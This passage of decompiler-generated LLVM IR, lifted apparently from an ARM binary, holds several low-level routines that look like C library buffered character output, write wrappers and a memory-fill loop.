  %v0_e9c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e9c0 = load i32, i32* @r5, align 4
  %v2_e9c0 = add i32 %v1_e9c0, 16
  %v3_e9c0 = inttoptr i32 %v2_e9c0 to i32*
  store i32 %v0_e9c0, i32* %v3_e9c0, align 4
  br i1 %v7_e9bc, label %dec_label_pc_ea00, label %dec_label_pc_e9f4.backedge

dec_label_pc_e9c8:                                ; preds = %dec_label_pc_e9a0
  %v1_e9f824 = inttoptr i32 %v1_e9f824.in to i8*
  %v3_e9c8 = call i32 @function_11cc8(i8* %v1_e9f824)
  %v4_e9c8 = trunc i32 %v3_e9c8 to i8
  %v5_e9cc = icmp eq i8 %v4_e9c8, -1
  store i1 %v5_e9cc, i1* %cpsr_c.global-to-local, align 1
  %v10_e9cc = icmp eq i32 %v3_e9c8, -1
  store i1 %v10_e9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_e9cc, label %dec_label_pc_e9d4, label %dec_label_pc_e9f0

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9c8
  %v0_e9d4 = load i32, i32* @r5, align 4
  %v1_e9d4 = inttoptr i32 %v0_e9d4 to i8*
  %v2_e9d4 = load i8, i8* %v1_e9d4, align 1
  %v1_e9d8 = and i8 %v2_e9d4, 8
  %v2_e9d8 = icmp eq i8 %v1_e9d8, 0
  store i1 %v2_e9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9d8, label %dec_label_pc_ea00, label %dec_label_pc_ea10

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9c8
  %v3_e9e4 = load i32, i32* @r4, align 4
  %v4_e9e4 = inttoptr i32 %v3_e9e4 to i8*
  store i8 %v4_e9c8, i8* %v4_e9e4, align 1
  %v0_e9e8 = load i32, i32* @r4, align 4
  %v1_e9e8 = inttoptr i32 %v0_e9e8 to i8*
  %v2_e9e8 = load i8, i8* %v1_e9e8, align 1
  %v5_e9e8 = add i32 %v0_e9e8, 1
  store i32 %v5_e9e8, i32* @r4, align 4
  %v2_e9ec = icmp ugt i8 %v2_e9e8, 9
  store i1 %v2_e9ec, i1* %cpsr_c.global-to-local, align 1
  %v7_e9ec = icmp eq i8 %v2_e9e8, 10
  store i1 %v7_e9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9ec, label %dec_label_pc_ea00, label %dec_label_pc_e9f4.backedge

dec_label_pc_e9f4.backedge:                       ; preds = %dec_label_pc_e9f0, %dec_label_pc_e9b0
  %v0_e9f4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_e9f8.pre = load i32, i32* @r5, align 4
  %v1_e9f4 = add i32 %v0_e9f4.pre, -1
  store i32 %v1_e9f4, i32* %r6.global-to-local, align 4
  %v2_e9f4 = icmp ne i32 %v0_e9f4.pre, 0
  store i1 %v2_e9f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f4 = icmp eq i32 %v0_e9f4.pre, 1
  store i1 %v7_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f4, label %dec_label_pc_ea00, label %dec_label_pc_e9a0

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9f4.preheader, %dec_label_pc_e9f0, %dec_label_pc_e9f4.backedge, %dec_label_pc_e9b0, %dec_label_pc_e9d4
  %v0_ea00 = load i32, i32* @r4, align 4
  %v1_ea00 = load i32, i32* %r7.global-to-local, align 4
  %v3_ea00 = icmp uge i32 %v0_ea00, %v1_ea00
  store i1 %v3_ea00, i1* %cpsr_c.global-to-local, align 1
  %v9_ea00 = icmp eq i32 %v0_ea00, %v1_ea00
  store i1 %v9_ea00, i1* %cpsr_z.global-to-local, align 1
  %v2_ea04 = xor i1 %v9_ea00, true
  %v3_ea04 = and i1 %v3_ea00, %v2_ea04
  br i1 %v3_ea04, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_ea00
  %v7_ea08 = inttoptr i32 %v0_ea00 to i8*
  store i8 0, i8* %v7_ea08, align 1
  %v0_ea0c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_ea0c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_ea00, %bb
  %v1_ea0c = phi i1 [ %v1_ea0c.pre, %bb ], [ %v9_ea00, %dec_label_pc_ea00 ]
  %v0_ea0c = phi i1 [ %v0_ea0c.pre, %bb ], [ %v3_ea00, %dec_label_pc_ea00 ]
  %v2_ea0c = xor i1 %v1_ea0c, true
  %v3_ea0c = and i1 %v0_ea0c, %v2_ea0c
  br i1 %v3_ea0c, label %.dec_label_pc_ea14_crit_edge, label %dec_label_pc_ea10

.dec_label_pc_ea14_crit_edge:                     ; preds = %.thread7
  %v0_ea14.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ea14

dec_label_pc_ea10:                                ; preds = %dec_label_pc_e984, %dec_label_pc_e9d4, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ea14

dec_label_pc_ea14:                                ; preds = %.dec_label_pc_ea14_crit_edge, %dec_label_pc_ea10
  %v0_ea14 = phi i32 [ %v0_ea14.pre, %.dec_label_pc_ea14_crit_edge ], [ 0, %dec_label_pc_ea10 ]
  ret i32 %v0_ea14

; uselistorder directives
  uselistorder i1 %v9_ea00, { 1, 0, 2 }
  uselistorder i32 %v1_ea00, { 1, 0 }
  uselistorder i32 %v0_ea00, { 0, 2, 1 }
  uselistorder i32 %v0_e9f4.pre, { 2, 0, 1 }
  uselistorder i1 %v2_e9d8, { 1, 0 }
  uselistorder i32 %v3_e9a0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_e9f824.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder label %dec_label_pc_ea14, { 1, 0 }
  uselistorder label %dec_label_pc_ea10, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_ea00, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_e9a0, { 1, 0 }
}

define i32 @function_ea1c(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ea1c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp5 = sext i8 %arg1 to i32
  store i32 %tmp5, i32* %r0.global-to-local, align 4
  %stack_var_-13 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_ea1c = load i32, i32* @r4, align 4
  store i32 %v3_ea1c, i32* %stack_var_-12, align 4
  %v6_ea1c = load i32, i32* @r5, align 4
  %v2_ea20 = add i32 %arg2, 16
  %v3_ea20 = inttoptr i32 %v2_ea20 to i32*
  %v4_ea20 = load i32, i32* %v3_ea20, align 4
  store i32 %v4_ea20, i32* %r2.global-to-local, align 4
  %v2_ea24 = add i32 %arg2, 28
  %v3_ea24 = inttoptr i32 %v2_ea24 to i32*
  %v4_ea24 = load i32, i32* %v3_ea24, align 4
  store i32 %v4_ea24, i32* %r3.global-to-local, align 4
  %v3_ea28 = icmp uge i32 %v4_ea20, %v4_ea24
  store i1 %v3_ea28, i1* %cpsr_c.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_ea34 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ea34, i32* @r5, align 4
  br i1 %v3_ea28, label %dec_label_pc_ea4c, label %.thread

.thread:                                          ; preds = %dec_label_pc_ea1c
  %v2_ea38 = urem i32 %v0_ea34, 256
  store i32 %v2_ea38, i32* %r3.global-to-local, align 4
  %v2_ea3c = trunc i32 %v0_ea34 to i8
  %v4_ea3c = inttoptr i32 %v4_ea20 to i8*
  store i8 %v2_ea3c, i8* %v4_ea3c, align 1
  %v5_ea3c = load i32, i32* %r2.global-to-local, align 4
  %v6_ea3c = add i32 %v5_ea3c, 1
  store i32 %v6_ea3c, i32* %r2.global-to-local, align 4
  %v0_ea40.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ea40.pr.pr, label %dec_label_pc_ea4c, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_ea40 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_ea40, i32* %r0.global-to-local, align 4
  store i32 %v6_ea3c, i32* %v3_ea20, align 4
  br label %dec_label_pc_eb18

dec_label_pc_ea4c:                                ; preds = %dec_label_pc_ea1c, %.thread
  %v3_ea4c = load i8, i8* %tmp, align 1
  %v4_ea4c = zext i8 %v3_ea4c to i32
  %v1_ea50 = and i32 %v4_ea4c, 192
  store i32 %v1_ea50, i32* %r3.global-to-local, align 4
  %v2_ea54 = icmp eq i32 %v1_ea50, 192
  store i1 %v2_ea54, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_ea54, label %dec_label_pc_ea70, label %dec_label_pc_ea5c

dec_label_pc_ea5c:                                ; preds = %dec_label_pc_ea4c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_ea64 = call i32 @function_11368(i8* nonnull %tmp, i32 128)
  store i32 %v4_ea64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea68 = icmp eq i32 %v4_ea64, 0
  br i1 %v2_ea68, label %dec_label_pc_ea70, label %dec_label_pc_eb14

dec_label_pc_ea70:                                ; preds = %dec_label_pc_ea5c, %dec_label_pc_ea4c
  %v0_ea70 = load i32, i32* @r4, align 4
  %v1_ea70 = add i32 %v0_ea70, 4
  %v2_ea70 = inttoptr i32 %v1_ea70 to i32*
  %v3_ea70 = load i32, i32* %v2_ea70, align 4
  store i32 %v3_ea70, i32* %r3.global-to-local, align 4
  %v2_ea74 = icmp ugt i32 %v3_ea70, -3
  store i1 %v2_ea74, i1* %cpsr_c.global-to-local, align 1
  %v7_ea74 = icmp eq i32 %v3_ea70, -2
  br i1 %v7_ea74, label %dec_label_pc_eb0c, label %dec_label_pc_ea7c

dec_label_pc_ea7c:                                ; preds = %dec_label_pc_ea70
  %v1_ea7c = add i32 %v0_ea70, 12
  %v2_ea7c = inttoptr i32 %v1_ea7c to i32*
  %v3_ea7c = load i32, i32* %v2_ea7c, align 4
  store i32 %v3_ea7c, i32* %r2.global-to-local, align 4
  %v1_ea80 = add i32 %v0_ea70, 8
  %v2_ea80 = inttoptr i32 %v1_ea80 to i32*
  %v3_ea80 = load i32, i32* %v2_ea80, align 4
  store i32 %v3_ea80, i32* %r3.global-to-local, align 4
  %v3_ea84 = icmp uge i32 %v3_ea7c, %v3_ea80
  store i1 %v3_ea84, i1* %cpsr_c.global-to-local, align 1
  %v9_ea84 = icmp eq i32 %v3_ea7c, %v3_ea80
  br i1 %v9_ea84, label %dec_label_pc_eaf0, label %dec_label_pc_ea8c

dec_label_pc_ea8c:                                ; preds = %dec_label_pc_ea7c
  %v1_ea8c = add i32 %v0_ea70, 16
  %v2_ea8c = inttoptr i32 %v1_ea8c to i32*
  %v3_ea8c = load i32, i32* %v2_ea8c, align 4
  store i32 %v3_ea8c, i32* %r3.global-to-local, align 4
  %v3_ea90 = icmp uge i32 %v3_ea7c, %v3_ea8c
  store i1 %v3_ea90, i1* %cpsr_c.global-to-local, align 1
  %v9_ea90 = icmp eq i32 %v3_ea7c, %v3_ea8c
  br i1 %v9_ea90, label %dec_label_pc_ea98, label %dec_label_pc_eaa8

dec_label_pc_ea98:                                ; preds = %dec_label_pc_ea8c
  store i32 %v0_ea70, i32* @r0, align 4
  %v0_ea9c = call i32 @function_d60c()
  store i32 %v0_ea9c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eaa0 = icmp eq i32 %v0_ea9c, 0
  br i1 %v2_eaa0, label %dec_label_pc_ea98.dec_label_pc_eaa8_crit_edge, label %dec_label_pc_eb14

dec_label_pc_ea98.dec_label_pc_eaa8_crit_edge:    ; preds = %dec_label_pc_ea98
  %v0_eaa8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_eaa8

dec_label_pc_eaa8:                                ; preds = %dec_label_pc_ea98.dec_label_pc_eaa8_crit_edge, %dec_label_pc_ea8c
  %v0_eaa8 = phi i32 [ %v0_eaa8.pre, %dec_label_pc_ea98.dec_label_pc_eaa8_crit_edge ], [ %v0_ea70, %dec_label_pc_ea8c ]
  %v1_eaa8 = add i32 %v0_eaa8, 16
  %v2_eaa8 = inttoptr i32 %v1_eaa8 to i32*
  %v3_eaa8 = load i32, i32* %v2_eaa8, align 4
  store i32 %v3_eaa8, i32* %r2.global-to-local, align 4
  %v0_eaac = load i32, i32* @r5, align 4
  %v1_eaac = urem i32 %v0_eaac, 256
  store i32 %v1_eaac, i32* %r1.global-to-local, align 4
  %v1_eab0 = trunc i32 %v0_eaac to i8
  %v3_eab0 = inttoptr i32 %v3_eaa8 to i8*
  store i8 %v1_eab0, i8* %v3_eab0, align 1
  %v4_eab0 = load i32, i32* %r2.global-to-local, align 4
  %v5_eab0 = add i32 %v4_eab0, 1
  store i32 %v5_eab0, i32* %r2.global-to-local, align 4
  %v0_eab4 = load i32, i32* @r4, align 4
  %v1_eab4 = add i32 %v0_eab4, 1
  %v2_eab4 = inttoptr i32 %v1_eab4 to i8*
  %v3_eab4 = load i8, i8* %v2_eab4, align 1
  %v4_eab4 = zext i8 %v3_eab4 to i32
  store i32 %v4_eab4, i32* %r3.global-to-local, align 4
  %tmp12 = urem i8 %v3_eab4, 2
  %v2_eab8 = icmp eq i8 %tmp12, 0
  %v2_eabc = add i32 %v0_eab4, 16
  %v3_eabc = inttoptr i32 %v2_eabc to i32*
  store i32 %v5_eab0, i32* %v3_eabc, align 4
  br i1 %v2_eab8, label %dec_label_pc_eb0c, label %dec_label_pc_eac4

dec_label_pc_eac4:                                ; preds = %dec_label_pc_eaa8
  %v0_eac4 = load i32, i32* %r1.global-to-local, align 4
  %v2_eac4 = icmp ugt i32 %v0_eac4, 9
  store i1 %v2_eac4, i1* %cpsr_c.global-to-local, align 1
  %v7_eac4 = icmp eq i32 %v0_eac4, 10
  br i1 %v7_eac4, label %dec_label_pc_eacc, label %dec_label_pc_eb0c

dec_label_pc_eacc:                                ; preds = %dec_label_pc_eac4
  %v0_eacc = load i32, i32* @r4, align 4
  store i32 %v0_eacc, i32* @r0, align 4
  %v0_ead0 = call i32 @function_d60c()
  store i32 %v0_ead0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ead4 = icmp eq i32 %v0_ead0, 0
  br i1 %v2_ead4, label %dec_label_pc_eb0c, label %dec_label_pc_eadc

dec_label_pc_eadc:                                ; preds = %dec_label_pc_eacc
  %v0_eadc = load i32, i32* @r4, align 4
  %v1_eadc = add i32 %v0_eadc, 16
  %v2_eadc = inttoptr i32 %v1_eadc to i32*
  %v3_eadc = load i32, i32* %v2_eadc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_eae4 = add i32 %v3_eadc, -1
  store i32 %v1_eae4, i32* %r3.global-to-local, align 4
  store i32 %v1_eae4, i32* %v2_eadc, align 4
  br label %dec_label_pc_eb18

dec_label_pc_eaf0:                                ; preds = %dec_label_pc_ea7c
  %v0_eaf4 = load i32, i32* @r5, align 4
  %v6_eaf4 = trunc i32 %v0_eaf4 to i8
  store i8 %v6_eaf4, i8* %stack_var_-13, align 1
  %v9_eaf4 = ptrtoint i8* %stack_var_-13 to i32
  store i32 %v9_eaf4, i32* %r1.global-to-local, align 4
  %v1_eaf8 = inttoptr i32 %v0_ea70 to i8*
  store i32 %v0_ea70, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_eb00 = call i32 @function_11174(i8* %v1_eaf8, i32 %v9_eaf4, i32 1)
  store i32 %v5_eb00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb04 = icmp eq i32 %v5_eb00, 0
  br i1 %v2_eb04, label %dec_label_pc_eb14, label %dec_label_pc_eb0c

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_eac4, %dec_label_pc_eaf0, %dec_label_pc_eacc, %dec_label_pc_eaa8, %dec_label_pc_ea70
  %v0_eb0c = load i32, i32* @r5, align 4
  %v1_eb0c = urem i32 %v0_eb0c, 256
  store i32 %v1_eb0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb18

dec_label_pc_eb14:                                ; preds = %dec_label_pc_ea98, %dec_label_pc_ea5c, %dec_label_pc_eaf0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb18

dec_label_pc_eb18:                                ; preds = %.thread2, %dec_label_pc_eb0c, %dec_label_pc_eadc, %dec_label_pc_eb14
  %v2_eb1c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_eb1c, i32* @r4, align 4
  store i32 %v6_ea1c, i32* @r5, align 4
  %v11_eb1c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_eb1c

; uselistorder directives
  uselistorder i32 %v0_eac4, { 1, 0 }
  uselistorder i32 %v0_eaac, { 1, 0 }
  uselistorder i32 %v0_ea70, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %v0_ea34, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 4, 5, 3, 6, 7, 8, 9, 2, 10, 12, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_eb18, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_eb14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_eb0c, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_ea4c, { 1, 0 }
}

define i32 @function_eb20(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_eb20:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_eb20 = load i32, i32* @r4, align 4
  store i32 %v3_eb20, i32* %stack_var_-16, align 4
  %v6_eb20 = load i32, i32* @r5, align 4
  %v9_eb20 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_eb2c = call i32 @function_ecc0()
  store i32 %v0_eb2c, i32* @r6, align 4
  %v0_eb34 = load i32, i32* @r5, align 4
  %v0_eb38 = load i32, i32* @r4, align 4
  %v4_eb44 = inttoptr i32 %v0_eb34 to i8*
  %v5_eb44 = call i32 @function_eb54(i32 %v0_eb38, i32 1, i32 %v0_eb2c, i8* %v4_eb44)
  %v1_eb48 = load i32, i32* @r6, align 4
  %v9_eb48 = icmp eq i32 %v5_eb44, %v1_eb48
  br i1 %v9_eb48, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_eb20
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_eb20, %bb
  %v14_eb50 = phi i32 [ %v5_eb44, %dec_label_pc_eb20 ], [ -1, %bb ]
  %v2_eb50 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_eb50, i32* @r4, align 4
  store i32 %v6_eb20, i32* @r5, align 4
  store i32 %v9_eb20, i32* @r6, align 4
  ret i32 %v14_eb50

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_eb54(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
dec_label_pc_eb54:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_eb54 = load i32, i32* @r6, align 4
  %v12_eb54 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_eb5c = load i8, i8* %arg4, align 1
  %v4_eb5c = zext i8 %v3_eb5c to i32
  %v1_eb60 = and i32 %v4_eb5c, 192
  store i32 %v1_eb60, i32* %r3.global-to-local, align 4
  %v2_eb64 = icmp eq i32 %v1_eb60, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_eb64, label %dec_label_pc_eb8c, label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %dec_label_pc_eb54
  %v4_eb80 = call i32 @function_11368(i8* nonnull %arg4, i32 128)
  %v2_eb84 = icmp eq i32 %v4_eb80, 0
  br i1 %v2_eb84, label %dec_label_pc_eb80.dec_label_pc_eb8c_crit_edge, label %dec_label_pc_ebf4

dec_label_pc_eb80.dec_label_pc_eb8c_crit_edge:    ; preds = %dec_label_pc_eb80
  %v0_eb8c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_eb8c

dec_label_pc_eb8c:                                ; preds = %dec_label_pc_eb80.dec_label_pc_eb8c_crit_edge, %dec_label_pc_eb54
  %v0_eb941 = phi i32 [ %v0_eb8c.pre, %dec_label_pc_eb80.dec_label_pc_eb8c_crit_edge ], [ %arg2, %dec_label_pc_eb54 ]
  %v2_eb8c = icmp eq i32 %v0_eb941, 0
  br i1 %v2_eb8c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_eb8c
  br label %dec_label_pc_ebf4

bb:                                               ; preds = %dec_label_pc_eb8c
  %v1_eb90 = load i32, i32* @r6, align 4
  %v3_eb90 = icmp eq i32 %v1_eb90, 0
  store i32 %v0_eb941, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  br i1 %v3_eb90, label %dec_label_pc_ebf4, label %dec_label_pc_eba0

dec_label_pc_eba0:                                ; preds = %bb
  %v0_eba0 = call i32 @function_148a4()
  %v0_eba4 = load i32, i32* @r6, align 4
  %v0_eba8 = load i32, i32* @r4, align 4
  store i32 %v0_eba8, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v0_eba4, %v0_eba0
  br i1 %tmp10, label %dec_label_pc_ebcc, label %dec_label_pc_ebb4

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_eba0
  %v0_ebac = load i32, i32* @r7, align 4
  %v1_ebb4 = load i32, i32* @r5, align 4
  %v2_ebb4 = mul i32 %v1_ebb4, %v0_eba4
  %v4_ebb8 = call i32 @function_11230(i32 %v0_ebac, i32 %v2_ebb4, i32 %v0_eba8)
  store i32 %v4_ebb8, i32* @r0, align 4
  %v0_ebbc = load i32, i32* @r5, align 4
  store i32 %v0_ebbc, i32* @r1, align 4
  %v0_ebc0 = call i32 @function_148a4()
  store i32 %v0_ebc0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ebf8

dec_label_pc_ebcc:                                ; preds = %dec_label_pc_eba0
  %v1_ebcc = inttoptr i32 %v0_eba8 to i32*
  %v2_ebcc = load i32, i32* %v1_ebcc, align 4
  %v1_ebd0 = or i32 %v2_ebcc, 8
  store i32 %v1_ebd0, i32* %r3.global-to-local, align 4
  %v3_ebd4 = sdiv i32 %v2_ebcc, 256
  store i32 %v3_ebd4, i32* %r2.global-to-local, align 4
  %v1_ebd8 = trunc i32 %v3_ebd4 to i8
  %v3_ebd8 = add i32 %v0_eba8, 1
  %v4_ebd8 = inttoptr i32 %v3_ebd8 to i8*
  store i8 %v1_ebd8, i8* %v4_ebd8, align 1
  %v0_ebdc = load i32, i32* %r3.global-to-local, align 4
  %v1_ebdc = trunc i32 %v0_ebdc to i8
  %v2_ebdc = load i32, i32* @r4, align 4
  %v3_ebdc = inttoptr i32 %v2_ebdc to i8*
  store i8 %v1_ebdc, i8* %v3_ebdc, align 1
  %v0_ebe0 = call i32 @function_cc08()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ebec = inttoptr i32 %v0_ebe0 to i32*
  store i32 22, i32* %v2_ebec, align 4
  %v0_ebf8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ebf8

dec_label_pc_ebf4:                                ; preds = %.thread, %dec_label_pc_eb80, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ebf8

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_ebcc, %dec_label_pc_ebb4, %dec_label_pc_ebf4
  %v0_ebf8 = phi i32 [ %v0_ebf8.pre, %dec_label_pc_ebcc ], [ %v0_ebc0, %dec_label_pc_ebb4 ], [ 0, %dec_label_pc_ebf4 ]
  store i32 %v9_eb54, i32* @r6, align 4
  store i32 %v12_eb54, i32* @r7, align 4
  ret i32 %v0_ebf8

; uselistorder directives
  uselistorder i32 %v3_ebd4, { 1, 0 }
  uselistorder i32 %v0_eba4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @function_11230, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_ebf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ebf4, { 2, 0, 1 }
}

define i32 @function_ec00(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ec00:
  %v2_ec0c = inttoptr i32 %arg2 to i8*
  %v3_ec0c = call i32 @function_11e00(i8* %v2_ec0c, i32 %arg1)
  ret i32 %v3_ec0c
}

define i32 @function_ec10() local_unnamed_addr {
dec_label_pc_ec10:
  %v0_ec10 = load i32, i32* @r0, align 4
  %v1_ec10 = load i32, i32* @r1, align 4
  %v2_ec10 = inttoptr i32 %v0_ec10 to i8*
  %v3_ec10 = call i32 @function_11e00(i8* %v2_ec10, i32 %v1_ec10)
  ret i32 %v3_ec10
}

define i32 @function_ec20(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ec20:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_ec24 = load i32, i32* @r2, align 4
  %v8_ec24 = icmp eq i32 %v0_ec24, 8
  store i1 %v8_ec24, i1* %cpsr_z.global-to-local, align 1
  %v5_ec28 = icmp slt i32 %v0_ec24, 8
  br i1 %v5_ec28, label %dec_label_pc_ec88, label %dec_label_pc_ec2c

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_ec20
  %v4_ec2c = mul i32 %arg2, 256
  %v5_ec2c = or i32 %v4_ec2c, %arg2
  %v4_ec30 = mul i32 %v5_ec2c, 65536
  %v5_ec30 = or i32 %v4_ec30, %v5_ec2c
  store i32 %v5_ec30, i32* %r1.global-to-local, align 4
  %v1_ec3457 = urem i32 %tmp, 4
  %v2_ec3458 = icmp eq i32 %v1_ec3457, 0
  store i1 %v2_ec3458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_ec3458, label %dec_label_pc_ec44, label %bb

bb:                                               ; preds = %dec_label_pc_ec2c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_ec2c ]
  %v3_ec3859 = phi i32 [ %v6_ec38, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_ec2c ]
  %v4_ec38 = inttoptr i32 %v3_ec3859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_ec38, align 1
  %v5_ec38 = load i32, i32* %r3.global-to-local, align 4
  %v6_ec38 = add i32 %v5_ec38, 1
  store i32 %v6_ec38, i32* %r3.global-to-local, align 4
  %v0_ec3c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_ec48.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_ec3c.pr, label %dec_label_pc_ec44, label %.thread

.thread:                                          ; preds = %bb
  %v2_ec3c = add i32 %v0_ec48.pr.pre, -1
  store i32 %v2_ec3c, i32* @r2, align 4
  %v1_ec34 = urem i32 %v6_ec38, 4
  %v2_ec34 = icmp eq i32 %v1_ec34, 0
  store i1 %v2_ec34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec34, label %dec_label_pc_ec44, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_ec38.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_ec38.pre to i8
  br label %bb

dec_label_pc_ec44:                                ; preds = %.thread, %bb, %dec_label_pc_ec2c
  %v0_ec5028 = phi i32 [ %tmp, %dec_label_pc_ec2c ], [ %v6_ec38, %bb ], [ %v6_ec38, %.thread ]
  %v0_ec48.pr = phi i32 [ %v0_ec24, %dec_label_pc_ec2c ], [ %v0_ec48.pr.pre, %bb ], [ %v2_ec3c, %.thread ]
  %v0_ec44 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_ec44, i32* @ip, align 4
  %v8_ec4810 = icmp eq i32 %v0_ec48.pr, 8
  store i1 %v8_ec4810, i1* %cpsr_z.global-to-local, align 1
  %v5_ec4c11 = icmp slt i32 %v0_ec48.pr, 8
